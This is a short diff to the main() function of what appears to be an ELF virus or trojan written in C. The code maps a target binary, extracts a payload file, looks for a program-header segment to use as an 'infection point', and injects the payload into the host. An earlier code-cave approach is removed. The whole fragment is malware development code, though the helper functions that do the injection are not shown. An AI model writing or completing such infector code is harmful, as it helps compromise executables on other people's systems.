@@ -1,26 +1,22 @@
 #include "trojan.h"
-#include<stdio.h>
-#include<errno.h>
-#include<elf.h>
-#include<unistd.h>
-#include<stdlib.h>
-#include<sys/mman.h>
-#include<sys/stat.h>
-#include<fcntl.h>
+
 
 
 int main(int argc,char **argv)
 {
-	int fd;
-	open_map_file(&fd,argv[1]);
+	open_map_file(argv[1]);
 
 	extract_payload("payload.bin");
 
-	create_code_cave();
-
-	patch_payload();
-
-	infect_host();
+	int segment = find_phdr();
+	if(segment<0)
+	{
+		printf("unable to find usable infection point\n");
+		exit(EXIT_FAILURE);
+	}
+	
+	infect_host(segment);	
+	
 
 	return 0;
 }
